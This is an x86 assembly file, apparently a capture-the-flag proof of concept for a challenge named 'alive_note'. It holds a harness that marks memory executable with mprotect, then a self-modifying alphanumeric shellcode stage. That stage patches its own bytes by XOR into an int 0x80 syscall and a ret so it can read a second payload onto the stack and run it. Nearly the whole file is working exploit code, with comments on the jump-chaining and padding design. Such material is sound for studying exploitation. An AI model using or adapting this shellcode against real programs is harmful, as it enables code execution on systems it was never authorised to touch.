#define EIGHT .byte 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00;
#define DUMMY .byte 0x61;
#define SIXTEEN EIGHT;EIGHT;
#define GAP EIGHT;SIXTEEN;SIXTEEN;SIXTEEN;

.globl main
.type main, @function

// This is just proof of concept, so it contains a tiny loader.
// DO NOT USE THIS SHELLCODE DIRECTLY
// 
// Creating regular alphanumeric shellcode is too long.
// Therefore, I created a buffer overflow at %esp address and return
// Why we need a short shellcode:
//   1. we don't have good debug environment in this challenge, and ... 
//   2. there's a jne/je in each short shellcode. In the worst case, we have to bruteforce each jne/je

main:
	lea shellcode, %edx;
	and $0xfffff000, %edx;
	push $0x7;
	push $0x1000;
	push %edx;
	call mprotect;
	
	// in alive_note's free() call, we have the following status

	xor %edx, %edx;      // %edx = 0
	lea shellcode, %eax; // %eax = shellcode_base (for self-modifying)
	test %eax, %eax;     // cflag = NOT EQUAL
	call *%eax;

shellcode:
	push $0x30; // popa: %eax = 0x30 
	push $0x70; // popa:  %ecx = 0x70
	push $0x7a; // popa: %edx = 0x7a
	.byte 0x75, 0x38; // jne (this + this.len)+0x38
	GAP;
	
	push %edx; // popa: %ebx = 0
	push %edx; // popa: ignore
	push %edx; // popa: %ebp = 0
	push %eax; // popa: %esi = base
	push %edx; // popa: %edi = anything
	popa;
	.byte 0x75, 0x38;
	GAP;
	
	// 0x32, 0x4f, 0x46 -> 0xcd, 0xb0, 0xb9
	dec %ebp; // %ebp = 0xffffffff
	xor %ebp, 0x64(%esi, %ecx, 2);
	inc %ebp;
	.byte 0x74, 0x38;
	GAP;

	// 0xcd, 0xb0, 0x47 -> 0xcd, 0x80, 0xb9
	xor %eax, 0x65(%esi, %ecx, 2);
	inc %edx;
	dec %edx;
	.byte 0x75, 0x38;
	GAP;
	
	// 0xcd, 0x80, 0xb9 -> 0xcd, 0x80, 0xc3;
	xor %edx, 0x66(%esi, %ecx, 2); 
	inc %edx;
	dec %edx;
	.byte 0x75, 0x38;
	GAP;

	xor $0x33, %al;
	push %esp;
	pop %ecx;
	.byte 0x32, 0x4f;	// int $0x80;
	.byte 0x46;       // ret; (0xc3)
	DUMMY;
